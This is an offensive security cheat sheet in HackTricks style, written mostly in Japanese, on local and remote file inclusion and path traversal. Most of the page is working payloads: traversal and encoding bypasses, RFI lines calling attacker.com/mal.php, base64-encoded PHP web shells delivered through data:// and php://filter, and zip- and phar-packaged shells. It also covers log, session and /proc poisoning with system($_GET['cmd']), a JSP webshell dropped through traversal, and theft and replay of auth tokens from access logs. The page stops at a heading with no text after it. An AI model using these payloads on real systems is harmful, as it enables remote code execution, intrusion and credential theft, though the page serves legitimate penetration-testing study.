# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** ファイルはリモートサーバから読み込まれます（利点: あなたがコードを書き、サーバがそれを実行します）。 In php this is **無効** by default (**allow_url_include**).\
**Local File Inclusion (LFI):** サーバはローカルファイルを読み込みます。

この脆弱性は、ユーザが何らかの方法でサーバが読み込むファイルを制御できる場合に発生します。

脆弱な**PHP関数**: require, require_once, include, include_once

A interesting tool to exploit this vulnerability: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**複数の \*nix LFI リストを組み合わせ、さらにパスを追加して私が作成したもの：**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

また `/` を `\` に変更してみてください\
また `../../../../../` を追加してみてください

ファイル /etc/password を見つけるためのいくつかのテクニックを使ったリスト（脆弱性が存在するか確認するため）は [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

異なる wordlists をマージしたもの：


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

また `/` を `\` に変更してみてください\
また `C:/` を削除して `../../../../../` を追加してみてください

ファイル /boot.ini を見つけるためのいくつかのテクニックを使ったリスト（脆弱性が存在するか確認するため）は [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

linux の LFI リストを確認してください。

## Basic LFI and bypasses

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences が非再帰的に除去される
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

提供された文字列の末尾にさらに文字が追加される処理をBypassする（bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
これは **PHP 5.4 以降で解決済み**

### **エンコーディング**

非標準のエンコーディング（例: double URL encode など）を使用できます:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 既存のフォルダから

バックエンドがフォルダパスをチェックしているかもしれません:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### サーバー上のファイルシステムディレクトリの探索

サーバーのファイルシステムは、ファイルだけでなくディレクトリも再帰的に探索して特定することができます。これにはディレクトリの深さを特定し、特定のフォルダの存在をプローブする手法を用います。以下はその詳細な方法です：

1. **ディレクトリの深さを特定する:** 現在のディレクトリの深さは、`/etc/passwd` ファイルを取得できるかどうかで判定します（サーバーがLinuxの場合）。例えば、深さが3であることを示すURLの例は以下のようになります：
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** 疑わしいフォルダ名（例: `private`）をURLに追加し、次に `/etc/passwd` に戻るようにアクセスします。追加されたディレクトリ階層分だけ depth を1つ増やす必要があります:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **結果の解釈:** サーバの応答はフォルダの存在有無を示します:
- **Error / No Output:** 指定された場所に `private` フォルダは存在しない可能性が高い。
- **Contents of `/etc/passwd`:** `private` フォルダの存在が確認される。
4. **再帰的探索:** 見つかったフォルダは、同じ手法や従来の Local File Inclusion (LFI) メソッドを使用して、サブディレクトリやファイルをさらに調査できます。

ファイルシステムの別の場所にあるディレクトリを調べる場合は、payload を適宜調整してください。例えば、カレントディレクトリが深さ3にあると仮定して、`/var/www/` に `private` ディレクトリが含まれているか確認するには、次のように実行します:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation は、ウェブアプリケーション内のファイルパスを操作するための手法です。ファイルパスの末尾に追加文字を付けるなどのセキュリティ対策を回避して、制限されたファイルにアクセスするために使われることが多いです。目的は、セキュリティ対策によって変更された後でも、依然として目的のファイルを指すようなファイルパスを作成することです。

In PHP、ファイルシステムの性質上、ファイルパスの様々な表現が同一と見なされることがあります。例えば：

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` はすべて同じパスとして扱われます。
- 末尾6文字が `passwd` の場合、末尾に `/` を付けて `passwd/` にしても対象のファイルは変わりません。
- 同様に、ファイルパスに `.php` が付く（例えば `shellcode.php`）場合、末尾に `/.` を付けてもアクセスされるファイルは変わりません。

以下の例は、機密性（ユーザーアカウント情報）からよく狙われる `/etc/passwd` にアクセスするために Path truncation を利用する方法を示しています：
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
これらのシナリオでは、必要なトラバーサルの回数が約2027回になることがありますが、この回数はserverの設定により変動します。

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) に追加のドットセグメントや文字を組み合わせることで、ファイルシステムを移動し、serverが付加した文字列を実質的に無視することができます。
- **Determining the Required Number of Traversals**: 試行錯誤により、root directoryへ、そして`/etc/passwd`へ到達するために必要な`../`の正確な数を見つけ出し、`.php`のような付加文字列を無効化しつつ目的のパス(`/etc/passwd`)を維持できます。
- **Starting with a Fake Directory**: パスの先頭を存在しないディレクトリ（例: `a/`）で始めるのは一般的な手法です。この手法は予防的措置として、またはserverのpath解析ロジックの要件を満たすために用いられます。

path truncation techniquesを用いる際は、serverのpath解析の挙動とファイルシステムの構造を理解していることが重要です。シナリオごとに異なるアプローチが必要になる場合があり、最も効果的な手法を見つけるにはテストが必要になることが多いです。

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

phpではデフォルトで無効になっています。これは **`allow_url_include`** が **Off.** のためです。動作させるには **On** にする必要があり、その場合、サーバー上のPHPファイルを含めて RCE を引き起こすことができます:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
もし何らかの理由で **`allow_url_include`** が **On** になっているが、PHP が外部ウェブページへのアクセスを**フィルタリング**している場合、[この投稿](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) によれば、例えば data protocol と base64 を使って b64 PHP コードをデコードし、RCE を得ることができます:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 前のコードでは、最後の `+.txt` は attacker が `.txt` で終わる文字列を必要としていたため追加されました。文字列はそれで終わり、b64 decode の後、その部分はただのゴミを返し、実際の PHP コードが含まれて（したがって実行され）ます。

別の例 **`php://` プロトコルを使用しないもの** は次のようになります:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python ルート要素

Python で次のようなコードの場合:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ユーザーが **absolute path** を **`file_name`** に渡すと、**前のパスは単に削除されます**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
これは[the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)に従った意図された動作です：

> あるコンポーネントが絶対パスである場合、それ以前のすべてのコンポーネントは破棄され、結合はその絶対パスコンポーネントから続行されます。

## Java のディレクトリ一覧

JavaでPath Traversalがあり、ファイルではなく**ディレクトリを要求した場合**、**ディレクトリの一覧が返される**ようです。他の言語では（私の知る限り）このようなことは起こりません。

## 上位25のパラメータ

以下は local file inclusion (LFI) 脆弱性の影響を受ける可能性がある上位25のパラメータの一覧です（出典：[link](https://twitter.com/trbughunters/status/1279768631845494787)）：
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI: PHP ラッパーとプロトコルの利用

### php://filter

PHP filters は、データが読み取られたり書き込まれたりする前に、基本的な **データへの修正操作** を実行できるようにします。フィルタは5つのカテゴリに分かれます:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: データからタグを除去します（"<" と ">" の間のすべての文字）
- このフィルタは現行の PHP バージョンでは削除されている点に注意してください
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 別のエンコーディングに変換します(`convert.iconv.<input_enc>.<output_enc>`) 。サポートされている**すべてのエンコーディングの一覧**を取得するには、コンソールで次を実行します: `iconv -l`

> [!WARNING]
> `convert.iconv.*` 変換フィルタを悪用すると、**任意のテキストを生成**できます。これにより任意のテキストを書き込んだり、include のような関数に任意のテキストを処理させたりするのに役立ちます。詳細は [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) を参照してください。

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: コンテンツを圧縮します（大量の情報を exfiltrating する場合に便利）
- `zlib.inflate`: データを展開します
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 非推奨
- `mdecrypt.*` : 非推奨
- Other Filters
- PHP で `var_dump(stream_get_filters());` を実行すると、いくつかの **予期しないフィルタ** を見つけることができます:
- `consumed`
- `dechunk`: HTTP の chunked エンコーディングを逆変換します
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" の部分は大文字小文字を区別しません

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) では、サーバーから出力が返されない状態でローカルファイルを読む手法が提案されています。この手法は **php filters をオラクルとして用いたファイルのブール的な抽出（文字ごと）** に基づいています。これは php filters がテキストを十分に大きくして php に例外を発生させるために使えるからです。

オリジナルの投稿には手法の詳細な説明がありますが、ここでは簡単な要約を示します:

- Use the codec **`UCS-4LE`** を使い、テキストの先頭文字を先頭に残したまま文字列サイズを指数的に増加させる。
- これにより、**初期文字が正しく推測された場合に非常に大きなテキストが生成され**、php が **error** を引き起こす。
- **dechunk** フィルタは **最初の文字が16進数でない場合にすべてを削除する** ので、最初の文字が16進数かどうかを判別できる。
- これと前述の手法（および推測した文字によって使う他のフィルタ）を組み合わせることで、十分な変換を施した結果として最初の文字が16進数でなくなる時点を観察し、テキスト先頭の文字を推測できる。もし16進数であれば dechunk は削除せず、初期のボムが作用して php がエラーを出すためである。
- コーデック **convert.iconv.UNICODE.CP930** は各文字を次の文字に変換する（このコーデック適用後: a -> b）。これにより、最初の文字が例えば `a` であるかを判別できる。というのも、このコーデックを6回適用すると a->b->c->d->e->f->g となり、その文字はもはや16進数の文字ではなくなるため dechunk は削除せず、初期のボムと掛け合わさって php のエラーが発生するからである。
- rot13 のような他の変換を最初に使うことで n, o, p, q, r のような他の文字を leak することが可能（他のコーデックで他の文字を16進数の範囲に移動させることもできる）。
- 先頭文字が数字の場合は base64 エンコードし、数字を取得するために最初の2文字を leak する必要がある。
- 最終的な問題は **初期文字以上のデータをどうやって leak するか** である。**convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** のような順序を入れ替えるメモリフィルタを使うことで文字の順序を変更し、テキストの他の文字を先頭に持ってくることが可能になる。
- さらに **より多くのデータ** を取得できるようにするためのアイデアは、**convert.iconv.UTF16.UTF16** で先頭に2バイトのジャンクデータを生成し、**UCS-4LE** を適用してそれを次の2バイトと **pivot** させ、d**elete the data until the junk data** を行ってジャンクデータになるまでデータを削除する（これにより元のテキストの最初の2バイトが削除される）。これを目的の位置に到達するまで繰り返す。

投稿ではこれを自動実行するツールも公開されています: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

このラッパーはプロセスが開いているファイル記述子にアクセスすることを可能にします。開かれているファイルの内容を取り出すのに有用である可能性があります:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr** to access the **ファイルディスクリプタ 0, 1 and 2** respectively（攻撃でどのように有用かは不明です）

### zip:// and rar://

PHPShell を含む Zip または Rar ファイルをアップロードしてアクセスする。\
rar protocol を悪用するためには、それを **明示的に有効化する必要があります**。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
このプロトコルは php の設定 **`allow_url_open`** と **`allow_url_include`** によって制限されることに注意してください。

### expect://

Expect が有効になっている必要があります。これを使ってコードを実行できます:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTパラメータにpayloadを指定してください:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

ウェブアプリケーションが `include` のような関数でファイルを読み込む場合、`.phar` ファイルを利用して PHP コードを実行できます。以下の PHP コードスニペットは `.phar` ファイルの作成例を示しています:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` ファイルをコンパイルするには、次のコマンドを実行してください:
```bash
php --define phar.readonly=0 create_path.php
```
実行すると `test.phar` というファイルが作成され、Local File Inclusion (LFI) 脆弱性の悪用に利用される可能性があります。

LFI がファイルの読み取りのみを行い、その中の PHP コードを実行しない場合（例えば `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, `filesize()` などを通じて）、deserialization 脆弱性の悪用を試みることができます。この脆弱性は `phar` プロトコルを使ったファイル読み取りに関連しています。

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — メモリまたは一時ファイルに書き込む（file inclusion attack でどのように有用かは不明）
- [file://](https://www.php.net/manual/en/wrappers.file.php) — ローカルファイルシステムへのアクセス
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL へのアクセス
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL へのアクセス
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 圧縮ストリーム
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — パターンに一致するパス名を検索（表示可能な出力を返さないため、ここではあまり有用ではない）
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — オーディオストリーム（任意のファイルを読む用途には有用ではない）

## LFI via PHP's 'assert'

PHP において 'assert' 関数は文字列内のコードを実行できるため、Local File Inclusion (LFI) のリスクが特に高くなります。特に、".." のようなディレクトリトラバーサル文字を含む入力が検査されているが適切にサニタイズされていない場合に問題になります。

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
これはtraversalを防ぐことを目的としていますが、意図せずcode injectionのベクターを生み出します。ファイルの内容を読むためにこれを悪用するには、攻撃者は次のようなものを使うことができます:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
同様に、任意のシステムコマンドを実行するには、次のようにすることができます:
```plaintext
' and die(system("id")) or '
```
重要なのは、これらのペイロードを**URL-encode**することです。

## PHP Blind Path Traversal

> [!WARNING]
> この手法は、**PHP function** が **access a file** する際の **file path** をあなたが **control** でき、かつファイルの内容が表示されない（例えば単純な呼び出し **`file()`** のようなケース）場合に関連します。

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

As sumary, the technique is using the **"UCS-4LE" encoding** to make the content of a file so **big** that the **PHP function opening** the file will trigger an **error**.

Then, in order to leak the first char the filter **`dechunk`** is used along with other such as **base64** or **rot13** and finally the filters **convert.iconv.UCS-4.UCS-4LE** and **convert.iconv.UTF16.UTF-16BE** are used to **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- パスを正規化して、許可リストにあるベースディレクトリの子孫であることを強制する。
- `..`、絶対ルート、またはドライブ文字を含むパスはすべて拒否する。生成されたファイル名を優先する。
- 書き込み処理を低権限アカウントで実行し、書き込み用ディレクトリを公開ルートから分離する。

## Remote File Inclusion

前述の通り、[**follow this link**](#remote-file-inclusion).

### Apache/Nginx ログファイル経由

Apache または Nginx サーバが include 関数内で **vulnerable to LFI** の場合、`/var/log/apache2/access.log` や `/var/log/nginx/access.log` にアクセスし、**user agent** や **GET parameter** に **`<?php system($_GET['c']); ?>`** のような PHP シェルを仕込み、そのファイルを include することができる。

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

これは他のログでも可能ですが、**be careful,** ログ内のコードが URL encoded されている可能性があり、これにより Shell が破壊されることがあります。ヘッダ **authorisation "basic"** は Base64 でエンコードされた "user:password" を含み、ログ内でデコードされます。PHPShell はこのヘッダ内に挿入できる可能性があります。\
その他のログパス：
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### アクセスログを読み、GET ベースの auth tokens を収集する (token replay)

多くのアプリは誤って session/auth tokens を GET 経由で受け入れてしまいます（例: AuthenticationToken, token, sid）。path traversal/LFI プリミティブで web server logs にアクセスできる場合、アクセスログからそれらのトークンを盗み出して replay することで認証を完全にバイパスできます。

How-to:
- Use the traversal/LFI to read the web server access log. Common locations:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Some endpoints return file reads Base64-encoded. If so, decode locally and inspect the log lines.
- Grep for GET requests that include a token parameter and capture its value, then replay it against the application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
ボディがBase64ならデコードして、キャプチャしたtokenをreplayする:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
注意:
- URLs 内の Tokens はデフォルトでログに記録されます。本番環境では GET 経由の bearer tokens を決して受け入れないでください。
- アプリが複数の token 名をサポートしている場合は、AuthenticationToken、token、sid、access_token のような一般的なキーを探してください。
- logs に leak した可能性のある tokens はすべてローテーションしてください。

### メール経由

**Send a mail** to a internal account (user@localhost) containing your PHP payload like `<?php echo system($_REQUEST["cmd"]); ?>` and try to include to the mail of the user with a path like **`/var/mail/<USERNAME>`** or **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* 経由

1. 大量の shells をアップロードする（例: 100）
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), with $PID = PID of the process (can be brute forced) and $FD the file descriptor (can be brute forced too)

### /proc/self/environ 経由

ログファイルのように、ペイロードを User-Agent に入れて送信すると /proc/self/environ に反映されます
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### アップロード経由

ファイルをアップロードできる場合は、その中にshell payloadを注入してください（例： `<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ファイルを読みやすく保つためには、pictures/doc/pdfのメタデータに注入するのが最良です

### ZIPファイルのアップロード経由

PHP shell を含む ZIPファイルをアップロードし、アクセスする:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHPセッション経由

ウェブサイトが PHP セッション (PHPSESSID) を使用しているか確認する
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPでは、これらのセッションは _/var/lib/php5/sess\\_\[PHPSESSID]\_ ファイルに保存されます
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Cookie を `<?php system('cat /etc/passwd');?>` に設定してください。
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFIを使ってPHPセッションファイルをincludeする
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh 経由

ssh が有効な場合は、どのユーザが使われているかを確認する（/proc/self/status & /etc/passwd）し、**\<HOME>/.ssh/id_rsa** にアクセスできないか試す。

### **経由** **vsftpd** _**logs**_

FTP サーバ vsftpd のログは _**/var/log/vsftpd.log**_ にあります。Local File Inclusion (LFI) 脆弱性が存在し、露出した vsftpd サーバにアクセスできる場合、次の手順を検討できます:

1. ログイン処理時に username フィールドに PHP ペイロードを注入する。
2. 注入後、LFI を利用してサーバログ _**/var/log/vsftpd.log**_ を取得する。

### php base64 filter 経由 (base64 を使用)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. You can use that to bypass the file extension check: if you supply base64 that ends with ".php", and it would just ignore the "." and append "php" to the base64. Here is an example payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters 経由（ファイル不要）

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)は、**php filters to generate arbitrary content** を出力として利用できると説明しています。要するに、ファイルに書き込むことなく include のために **generate arbitrary php code** を生成できるということです。

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault 経由

**Upload** したファイルは `/tmp` に **temporary** として保存されます。次に同じリクエスト（**same request,**）内で **segmentation fault** を発生させると、その **temporary file won't be deleted** ため、探して利用できることがあります。

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx の一時ファイルストレージ経由

もし **Local File Inclusion** を発見し、PHP の前で **Nginx** が動作している場合、次の手法で RCE を得られる可能性があります:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS を利用

たとえ **Local File Inclusion** を発見していても **don't have a session** で `session.auto_start` が `Off` の場合があります。その場合、**`PHP_SESSION_UPLOAD_PROGRESS`** を **multipart POST** データに含めると、PHP が **enable the session for you** します。これを悪用して RCE を得ることができます:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows 上の temp file uploads 経由

もし **Local File Inclusion** を発見し、サーバが **Windows** 上で動作していれば RCE を得られることがあります:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args 経由

